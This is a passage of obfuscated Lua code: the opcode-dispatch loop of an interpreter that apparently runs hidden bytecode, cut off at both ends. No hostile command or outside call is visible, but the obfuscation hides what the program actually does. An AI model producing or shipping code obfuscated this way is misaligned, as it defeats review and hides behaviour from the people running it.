ba==1)then if(0==ba)then bb=nil else w[y[131]]=j[y[834]];end else if(ba>2)then y=f[n];else n=(n+1);end end else if ba<=5 then if ba<5 then w[y[131]]=w[y[834]][y[784]];else n=(n+1);end else if not(ba~=6)then y=f[n];else w[y[131]]=h[y[834]];end end end else if(ba<11 or ba==11)then if(ba==9 or ba<9)then if ba<9 then n=n+1;else y=f[n];end else if(10==ba)then w[y[131]]=w[y[834]][y[784]];else n=(n+1);end end else if(ba==13 or ba<13)then if ba>12 then bb=y[131]else y=f[n];end else if not(ba==15)then w[bb]=w[bb](w[bb+1])else break end end end end ba=(ba+1)end elseif not(115~=z)then local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if ba>0 then w={};else bb=nil end else if ba<=2 then for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;else if ba>3 then y=f[n];else n=n+1;end end end else if ba<=7 then if ba<=5 then w[y[131]]=h[y[834]];else if 6==ba then n=n+1;else y=f[n];end end else if ba<=8 then w[y[131]]=w[y[834]][y[784]];else if 10~=ba then n=n+1;else y=f[n];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then w[y[131]]=h[y[834]];else if 13~=ba then n=n+1;else y=f[n];end end else if ba<=14 then w[y[131]]=h[y[834]];else if ba<16 then n=n+1;else y=f[n];end end end else if ba<=19 then if ba<=17 then w[y[131]]=w[y[834]][w[y[784]]];else if 18==ba then n=n+1;else y=f[n];end end else if ba<=20 then bb=y[131]else if 22>ba then w[bb](w[bb+1])else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if ba>0 then w[y[131]]=w[y[834]][y[784]];else bb=nil end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5~=ba then w[y[131]]=y[834];else n=n+1;end else if ba==6 then y=f[n];else w[y[131]]=y[834];end end end else if ba<=11 then if ba<=9 then if 8==ba then n=n+1;else y=f[n];end else if 11~=ba then w[y[131]]=y[834];else n=n+1;end end else if ba<=13 then if 13>ba then y=f[n];else bb=y[131]end else if ba~=15 then w[bb]=w[bb](r(w,bb+1,y[834]))else break end end end end ba=ba+1 end end;elseif(117>=z)then w[y[131]]=w[y[834]][y[784]];elseif(z>118)then local ba=y[131];w[ba]=w[ba]-w[ba+2];n=y[834];else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[131]]=h[y[834]];end end end else if ba<=6 then if ba<6 then y=f[n];else w[y[131]]=h[y[834]];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if 13<ba then y=f[n];else n=n+1;end end end else if ba<=16 then if 15<ba then bc={w[bd](w[bd+1])};else bd=y[131]end else if ba<=17 then bb=0;else if ba<19 then for be=bd,y[784]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(z<=131)then if(z==125 or z<125)then if(122>z or 122==z)then if z<=120 then local ba,bb=0 while true do if(ba<7 or ba==7)then if(ba<3 or ba==3)then if ba<=1 then if not(ba==1)then bb=nil else w[y[131]][y[834]]=w[y[784]];end else if 3>ba then n=(n+1);else y=f[n];end end else if(ba==5 or ba<5)then if ba>4 then n=(n+1);else w[y[131]]={};end else if(7>ba)then y=f[n];else w[y[131]][y[834]]=y[784];end end end else if ba<=11 then if(ba<9 or ba==9)then if 8<ba then y=f[n];else n=n+1;end else if(ba>10)then n=(n+1);else w[y[131]][y[834]]=w[y[784]];end end else if(ba<=13)then if not(12~=ba)then y=f[n];else bb=y[131]end else if 14<ba then break else w[bb]=w[bb](r(w,bb+1,y[834]))end end end end ba=(ba+1)end elseif 121<z then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else w[y[131]]=w[y[834]][y[784]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba>4 then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if ba<=6 then y=f[n];else if ba>7 then n=n+1;else w[y[131]]=w[y[834]][y[784]];end end end end else if ba<=13 then if ba<=10 then if 9==ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if ba<=11 then n=n+1;else if 12<ba then w[y[131]]=false;else y=f[n];end end end else if ba<=15 then if 15~=ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[131]else if ba>17 then break else w[bb](w[bb+1])end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=11 then if ba<=5 then if ba<=2 then if ba<=0 then bb=nil else if 2>ba then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if ba<=3 then y=f[n];else if 5>ba then w[y[131]]=j[y[834]];else n=n+1;end end end else if ba<=8 then if ba<=6 then y=f[n];else if ba<8 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if ba<=9 then y=f[n];else if ba>10 then n=n+1;else w[y[131]]=w[y[834]][y[784]];end end end end else if ba<=17 then if ba<=14 then if ba<=12 then y=f[n];else if ba>13 then n=n+1;else w[y[131]]=w[y[834]][y[784]];end end else if ba<=15 then y=f[n];else if 17>ba then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end else if ba<=20 then if ba<=18 then y=f[n];else if ba~=20 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if ba<=22 then if 21==ba then y=f[n];else bb=y[131]end else if 24>ba then w[bb]=w[bb](r(w,bb+1,y[834]))else break end end end end end ba=ba+1 end end;elseif(z<123 or z==123)then local ba=y[131]w[ba]=w[ba](r(w,(ba+1),p))elseif not(124~=z)then local ba,bb,bc,bd=0 while true do if ba<=15 then if ba<=7 then if ba<=3 then if ba<=1 then if ba<1 then bb=nil else bc=nil end else if ba==2 then bd=nil else w[y[131]]=w[y[834]][y[784]];end end else if ba<=5 then if 5~=ba then n=n+1;else y=f[n];end else if ba~=7 then w[y[131]]=h[y[834]];else n=n+1;end end end else if ba<=11 then if ba<=9 then if ba~=9 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if ba<11 then n=n+1;else y=f[n];end end else if ba<=13 then if 13~=ba then w[y[131]]=w[y[834]][w[y[784]]];else n=n+1;end else if 14<ba then w[y[131]]=h[y[834]];else y=f[n];end end end end else if ba<=23 then if ba<=19 then if ba<=17 then if 16==ba then n=n+1;else y=f[n];end else if ba<19 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end else if ba<=21 then if 20==ba then y=f[n];else w[y[131]]=j[y[834]];end else if ba==22 then n=n+1;else y=f[n];end end end else if ba<=27 then if ba<=25 then if 24<ba then n=n+1;else w[y[131]]=w[y[834]][y[784]];end else if 27~=ba then y=f[n];else bd=y[834];end end else if ba<=29 then if 28<ba then bb=k(w,g,bd,bc);else bc=y[784];end else if ba<31 then w[y[131]]=bb;else break end end end end end ba=ba+1 end else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4~=ba then w[y[131]]=j[y[834]];else n=n+1;end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if ba<=7 then n=n+1;else if 8<ba then w[y[131]]=w[y[834]][y[784]];else y=f[n];end end end end else if ba<=14 then if ba<=11 then if ba==10 then n=n+1;else y=f[n];end else if ba<=12 then w[y[131]]=w[y[834]][y[784]];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba==15 then bd=y[131]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19>ba then for be=bd,y[784]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end end;elseif(z<=128)then if(126>z or 126==z)then w[y[131]]();elseif(z>127)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba>0 then w[y[131]]=w[y[834]][y[784]];else bb=nil end else if ba==2 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[131]]=h[y[834]];else n=n+1;end else if ba<=6 then y=f[n];else if 8~=ba then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 9==ba then y=f[n];else w[y[131]]=y[834];end else if ba<=11 then n=n+1;else if 13>ba then y=f[n];else w[y[131]]=y[834];end end end else if ba<=15 then if ba>14 then y=f[n];else n=n+1;end else if ba<=16 then bb=y[131]else if 18~=ba then w[bb]=w[bb](r(w,bb+1,y[834]))else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0==ba then bb=nil else w[y[131]]=j[y[834]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if ba~=5 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if ba<=6 then y=f[n];else if 7<ba then n=n+1;else w[y[131]]=y[834];end end end end else if ba<=13 then if ba<=10 then if 10~=ba then y=f[n];else w[y[131]]=y[834];end else if ba<=11 then n=n+1;else if 13>ba then y=f[n];else w[y[131]]=y[834];end end end else if ba<=15 then if 15>ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[131]else if 18>ba then w[bb]=w[bb](r(w,bb+1,y[834]))else break end end end end end ba=ba+1 end end;elseif(z<129 or z==129)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba~=4 then w[y[131]]=h[y[834]];else n=n+1;end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[131]]=h[y[834]];end else if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba~=16 then bd=y[131]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba~=19 then for be=bd,y[784]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif(z<131)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 3<ba then n=n+1;else w[y[131]]=h[y[834]];end end end else if ba<=6 then if ba~=6 then y=f[n];else w[y[131]]=h[y[834]];end else if ba<=7 then n=n+1;else if 8==ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if ba<14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba>15 then bc={w[bd](w[bd+1])};else bd=y[131]end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[784]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba,bb=0 while true do if ba<=22 then if ba<=10 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else w[y[131]]=w[y[834]][y[784]];end else if ba<=2 then n=n+1;else if ba==3 then y=f[n];else w[y[131]]=h[y[834]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba<7 then y=f[n];else w[y[131]]=h[y[834]];end end else if ba<=8 then n=n+1;else if 9==ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if ba<=16 then if ba<=13 then if ba<=11 then n=n+1;else if 13~=ba then y=f[n];else w[y[131]]=w[y[834]][w[y[784]]];end end else if ba<=14 then n=n+1;else if 15==ba then y=f[n];else w[y[131]]={};end end end else if ba<=19 then if ba<=17 then n=n+1;else if 19~=ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end else if ba<=20 then n=n+1;else if 22~=ba then y=f[n];else w[y[131]][y[834]]=w[y[784]];end end end end end else if ba<=33 then if ba<=27 then if ba<=24 then if ba==23 then n=n+1;else y=f[n];end else if ba<=25 then w[y[131]]=h[y[834]];else if ba~=27 then n=n+1;else y=f[n];end end end else if ba<=30 then if ba<=28 then w[y[131]]=w[y[834]][y[784]];else if 29==ba then n=n+1;else y=f[n];end end else if ba<=31 then w[y[131]][y[834]]=w[y[784]];else if 33~=ba then n=n+1;else y=f[n];end end end end else if ba<=39 then if ba<=36 then if ba<=34 then w[y[131]]=h[y[834]];else if ba==35 then n=n+1;else y=f[n];end end else if ba<=37 then w[y[131]]=w[y[834]][y[784]];else if ba>38 then y=f[n];else n=n+1;end end end else if ba<=42 then if ba<=40 then w[y[131]][y[834]]=w[y[784]];else if ba>41 then y=f[n];else n=n+1;end end else if ba<=43 then bb=y[131]else if ba>44 then break else w[bb](r(w,bb+1,y[834]))end end end end end end ba=ba+1 end end;elseif(z<137 or z==137)then if(z<134 or z==134)then if(132>z or 132==z)then local ba=y[131];do return r(w,ba,p)end;elseif not(not(z~=134))then w[y[131]]={r({},1,y[834])};else w[y[131]]=b(d[y[834]],nil,j);end;elseif 135>=z then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if 0<ba then w[y[131]]=w[y[834]][y[784]];else bb=nil end else if ba<3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if ba<=6 then y=f[n];else if 7==ba then w[y[131]]=w[y[834]][y[784]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if 10>ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end else if ba<=11 then n=n+1;else if ba~=13 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if ba<=15 then if 15~=ba then n=n+1;else y=f[n];end else if ba<=16 then bb=y[131]else if 17==ba then w[bb]=w[bb](w[bb+1])else break end end end end end ba=ba+1 end elseif(137>z)then local ba=0 while true do if ba<=6 then if ba<=2 then if ba<=0 then w[y[131]]=w[y[834]][y[784]];else if 2~=ba then n=n+1;else y=f[n];end end else if ba<=4 then if ba==3 then w[y[131]]=w[y[834]][y[784]];else n=n+1;end else if 5==ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if ba<=9 then if ba<=7 then n=n+1;else if ba==8 then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end else if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if 12==ba then if w[y[131]]then n=n+1;else n=y[834];end;else break end end end end ba=ba+1 end else local ba=y[131]local bb={}for bc=1,#v do local bd=v[bc]for be=1,#bd do local bd=bd[be]local be,be=bd[1],bd[2]if(be==ba or be>ba)then bb[be]=w[be]bd[1]=bb v[bc]=nil;end end end end;elseif(z==140 or z<140)then if 138>=z then local ba,bb=0 while true do if ba<=7 then if ba<=3 then if ba<=1 then if 0<ba then w[y[131]]=w[y[834]][y[784]];else bb=nil end else if ba>2 then y=f[n];else n=n+1;end end else if ba<=5 then if ba<5 then w[y[131]]=w[y[834]];else n=n+1;end else if ba==6 then y=f[n];else w[y[131]]=h[y[834]];end end end else if ba<=11 then if ba<=9 then if ba~=9 then n=n+1;else y=f[n];end else if ba<11 then w[y[131]]=w[y[834]][w[y[784]]];else n=n+1;end end else if ba<=13 then if ba~=13 then y=f[n];else bb=y[131]end else if 15>ba then w[bb]=w[bb](r(w,bb+1,y[834]))else break end end end end ba=ba+1 end elseif(140~=z)then local ba=y[131];local bb=w[ba];for bc=(ba+1),y[834]do t(bb,w[bc])end;else local ba=y[131]local bb={w[ba](w[ba+1])};local bc=0;for bd=ba,y[784]do bc=bc+1;w[bd]=bb[bc];end end;elseif(z<141 or z==141)then local ba=0 while true do if(ba<6 or ba==6)then if(ba<=2)then if ba<=0 then w[y[131]]=h[y[834]];else if(ba~=2)then n=n+1;else y=f[n];end end else if(ba==4 or ba<4)then if 4>ba then w[y[131]]=h[y[834]];else n=(n+1);end else if(ba<6)then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end else if(ba<9 or ba==9)then if ba<=7 then n=(n+1);else if not(9==ba)then y=f[n];else w[y[131]]=w[y[834]][w[y[784]]];end end else if(ba<=11)then if(11>ba)then n=(n+1);else y=f[n];end else if not(13==ba)then if(w[y[131]]~=y[784])then n=(n+1);else n=y[834];end;else break end end end end ba=(ba+1)end elseif z==142 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 0==ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[131]]=h[y[834]];else n=n+1;end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[131]]=h[y[834]];end else if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[131]]=w[y[834]][y[784]];end end end end else if ba<=14 then if ba<=11 then if 11~=ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[131]]=w[y[834]][w[y[784]]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if 16~=ba then bd=y[131]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[784]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end else local ba=y[131]w[ba](w[ba+1])end;elseif 167>=z then if 155>=z then if 149>=z then if z<=146 then if 144>=z then local ba;w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))elseif z>145 then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];else w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];end;elseif 147>=z then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if w[y[131]]then n=n+1;else n=y[834];end;elseif z==148 then local ba;local bb;local bc;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];bc=y[834];bb=y[784];ba=k(w,g,bc,bb);w[y[131]]=ba;else w[y[131]]=false;end;elseif z<=152 then if 150>=z then local ba;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](w[ba+1])elseif z~=152 then if(w[y[131]]<=w[y[784]])then n=n+1;else n=y[834];end;else local ba;local bb;w={};for bc=0,u,1 do if bc<o then w[bc]=s[bc+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];bb=y[131];ba=w[y[834]];w[bb+1]=ba;w[bb]=ba[y[784]];end;elseif z<=153 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if w[y[131]]then n=n+1;else n=y[834];end;elseif 155>z then local ba;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](w[ba+1])else local ba;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](w[ba+1])end;elseif 161>=z then if z<=158 then if 156>=z then w[y[131]]=w[y[834]]/y[784];elseif 157<z then local ba;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))else local ba;w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif z<=159 then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];if(w[y[131]]~=y[784])then n=n+1;else n=y[834];end;elseif z~=161 then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if w[y[131]]then n=n+1;else n=y[834];end;else w[y[131]]={r({},1,y[834])};end;elseif z<=164 then if 162>=z then local ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))elseif 163==z then local ba=y[131]w[ba](w[ba+1])else local ba;w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]][y[834]]=y[784];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];ba=y[131]w[ba]=w[ba](r(w,ba+1,y[834]))end;elseif 165>=z then local ba;local bb;w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]={r({},1,y[834])};n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];bb=y[131];ba=w[bb];for bc=bb+1,y[834]do t(ba,w[bc])end;elseif 167>z then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if(w[y[131]]~=w[y[784]])then n=n+1;else n=y[834];end;else w[y[131]]=w[y[834]]-y[784];end;elseif 179>=z then if z<=173 then if z<=170 then if 168>=z then if(w[y[131]]<=w[y[784]])then n=y[834];else n=n+1;end;elseif z<170 then local ba=w[y[784]];if not ba then n=n+1;else w[y[131]]=ba;n=y[834];end;else local ba=y[131];local bb=w[y[834]];w[ba+1]=bb;w[ba]=bb[y[784]];end;elseif 171>=z then w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];if w[y[131]]then n=n+1;else n=y[834];end;elseif 173~=z then w[y[131]]=w[y[834]]+y[784];else if(w[y[131]]~=w[y[784]])then n=y[834];else n=n+1;end;end;elseif 176>=z then if 174>=z then local ba=y[131];p=ba+x-1;for x=ba,p do local q=q[x-ba];w[x]=q;end;elseif z<176 then local q;local x;local ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];ba=y[131]x={w[ba](w[ba+1])};q=0;for bb=ba,y[784]do q=q+1;w[bb]=x[q];end else local q;local x;local ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];ba=y[131]x={w[ba](w[ba+1])};q=0;for bb=ba,y[784]do q=q+1;w[bb]=x[q];end end;elseif 177>=z then local q=y[131];w[q]=w[q]-w[q+2];n=y[834];elseif z<179 then w[y[131]]=w[y[834]];else w[y[131]][w[y[834]]]=w[y[784]];end;elseif 185>=z then if z<=182 then if 180>=z then w[y[131]]=w[y[834]]-w[y[784]];elseif 182>z then local q;w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))else if(w[y[131]]<w[y[784]])then n=n+1;else n=y[834];end;end;elseif 183>=z then local q;w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))elseif z<185 then local q=y[131];local x=w[y[834]];w[q+1]=x;w[q]=x[y[784]];else local q;local x;local ba;w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][w[y[784]]];n=n+1;y=f[n];ba=y[131]x={w[ba](w[ba+1])};q=0;for bb=ba,y[784]do q=q+1;w[bb]=x[q];end end;elseif 188>=z then if z<=186 then local q;w[y[131]]=j[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];w[y[131]]=y[834];n=n+1;y=f[n];q=y[131]w[q]=w[q](r(w,q+1,y[834]))elseif 187<z then local q;local x;w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]=w[y[834]][y[784]];n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]={};n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]=h[y[834]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]][y[834]]=w[y[784]];n=n+1;y=f[n];w[y[131]]={r({},1,y[834])};n=n+1;y=f[n];w[y[131]]=w[y[834]];n=n+1;y=f[n];x=y[131];q=w[x];for ba=x+1,y[834]do t(q,w[ba])end;else local q=y[131];local x=w[q];for ba=q+1,p do t(x,w[ba])end;end;elseif z<=190 then if z<190 then local q=y[834];local x=y[784];local q=k(w,g,q,x);w[y[131]]=q;else local q;local x;local 